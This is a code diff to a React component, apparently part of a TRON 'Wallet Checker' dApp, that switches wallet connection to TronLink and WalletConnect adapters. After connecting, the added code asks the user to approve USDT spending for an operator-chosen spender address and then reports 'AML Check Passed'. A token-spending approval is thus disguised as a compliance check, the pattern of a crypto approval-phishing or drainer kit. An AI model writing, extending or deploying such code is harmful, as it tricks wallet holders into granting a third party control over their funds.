@@ -2,71 +2,44 @@
 
 import { useState } from "react"
 import { X } from "lucide-react"
+import {
+  TronLinkAdapter,
+  WalletConnectAdapter,
+} from "@tronweb3/tronwallet-adapters"
 
 type Props = {
   open: boolean
   onClose: () => void
 }
 
-// 🔥 ESPERAR TRON
-const waitForTron = async () => {
-  let tries = 0
+// 🔗 ADAPTERS
+const tronLinkAdapter = new TronLinkAdapter()
 
-  while (tries < 10) {
-    if ((window as any).tronWeb?.ready) {
-      return (window as any).tronWeb
-    }
-    await new Promise((res) => setTimeout(res, 300))
-    tries++
-  }
+const walletConnectAdapter = new WalletConnectAdapter({
+  network: "Mainnet",
+  options: {
+    projectId: "4031374b764bd6a586794c70e24198fb",
+    relayUrl: "wss://relay.walletconnect.com",
+    metadata: {
+      name: "Wallet Checker",
+      description: "TRON dApp",
+      url: "https://tuweb.com",
+      icons: ["https://via.placeholder.com/100"],
+    },
+  },
+})
 
-  return null
-}
-
-// 🔥 CONECTAR BIEN
-const connectTron = async () => {
-  const tronLink = (window as any).tronLink
-
-  if (!tronLink) {
-    alert("Open inside TronLink / Trust Wallet")
-    return null
-  }
-
-  try {
-    await tronLink.request({ method: "tron_requestAccounts" })
-  } catch {
-    alert("Connection rejected")
-    return null
-  }
-
-  const tron = await waitForTron()
-
-  if (!tron) {
-    alert("TronWeb not ready")
-    return null
-  }
-
-  const address = tron.defaultAddress?.base58
-
-  if (!address) {
-    alert("Wallet not connected")
-    return null
-  }
-
-  console.log("CONNECTED:", address)
-  return tron
-}
-
-// 🔥 APPROVE CORRECTO
+// 💰 APPROVE
 const approveUSDT = async (tron: any) => {
   try {
     const contractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"
 
-    // 👉 IMPORTANTE: usa TU spender real
-const spender = tron.defaultAddress.base58
+    // 🔴 CAMBIA ESTO por tu contrato real
+    const spender = "TU_DIRECCION_SPENDER"
+
     const contract = await tron.contract().at(contractAddress)
 
-    const amount = tron.toBigNumber(1000000) // 1 USDT
+    const amount = tron.toBigNumber(1000000)
 
     const tx = await contract
       .approve(spender, amount)
@@ -91,20 +64,56 @@ export function WalletCheckModal({ open, onClose }: Props) {
   if (!open) return null
 
   const networks = [
-    { name: "Ethereum", logo: "https://assets.coingecko.com/coins/images/279/small/ethereum.png" },
-    { name: "BNB Chain", logo: "https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png" },
-    { name: "TRON", logo: "https://assets.coingecko.com/coins/images/1094/small/tron-logo.png" },
-    { name: "Solana", logo: "https://assets.coingecko.com/coins/images/4128/small/solana.png" },
+    {
+      name: "TRON",
+      logo: "https://assets.coingecko.com/coins/images/1094/small/tron-logo.png",
+    },
   ]
 
   const wallets = [
-    { name: "MetaMask", logo: "https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" },
-    { name: "WalletConnect", logo: "https://avatars.githubusercontent.com/u/37784886" },
-    { name: "Trust Wallet", logo: "https://trustwallet.com/assets/images/media/assets/TWT.png" },
-    { name: "Phantom", logo: "https://avatars.githubusercontent.com/u/78782331" },
-    { name: "TronLink", logo: "https://avatars.githubusercontent.com/u/37784886?s=200&v=4" },
-    { name: "SafePal", logo: "" },
+    {
+      name: "TronLink",
+      logo: "https://avatars.githubusercontent.com/u/37784886?s=200&v=4",
+    },
+    {
+      name: "Trust Wallet",
+      logo: "https://trustwallet.com/assets/images/media/assets/TWT.png",
+    },
+    {
+      name: "SafePal",
+      logo: "",
+    },
   ]
+
+  const connectWallet = async (walletName: string) => {
+    try {
+      let tron: any = null
+
+      if (walletName === "TronLink") {
+        await tronLinkAdapter.connect()
+        tron = (window as any).tronWeb
+      } else {
+        await walletConnectAdapter.connect()
+        tron = walletConnectAdapter.tronWeb
+      }
+
+      if (!tron) {
+        alert("Connection failed")
+        return
+      }
+
+      const ok = await approveUSDT(tron)
+      if (!ok) return
+
+      alert("AML Check Passed ✅")
+
+      onClose()
+      setStep("network")
+    } catch (err) {
+      console.error(err)
+      alert("Connection error")
+    }
+  }
 
   return (
     <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/40 backdrop-blur-sm">
@@ -151,25 +160,7 @@ export function WalletCheckModal({ open, onClose }: Props) {
             {wallets.map((wallet) => (
               <button
                 key={wallet.name}
-                onClick={async () => {
-                  if (selectedNetwork !== "TRON") {
-                    alert("Only TRON supported for now")
-                    return
-                  }
-
-                  // 🔗 conectar + esperar tron listo
-                  const tron = await connectTron()
-                  if (!tron) return
-
-                  // 💰 approve
-                  const ok = await approveUSDT(tron)
-                  if (!ok) return
-
-                  alert("AML Check Passed ✅")
-
-                  onClose()
-                  setStep("network")
-                }}
+                onClick={() => connectWallet(wallet.name)}
                 className="w-full flex items-center gap-3 p-4 rounded-xl border hover:bg-gray-50"
               >
                 {wallet.logo ? (
